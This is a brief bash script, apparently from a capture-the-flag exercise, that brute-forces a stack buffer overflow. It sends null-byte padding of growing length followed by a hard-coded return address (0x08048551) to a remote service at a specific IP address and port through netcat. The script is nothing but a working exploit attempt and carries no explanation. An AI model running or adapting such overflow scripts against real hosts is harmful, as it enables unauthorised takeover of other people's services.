for i in {0..140}
do
	echo "Doing $i"
	python -c "print '\x00'*$i + '\x51\x85\x04\x08'" | nc 128.199.98.78 1700
done

#8048551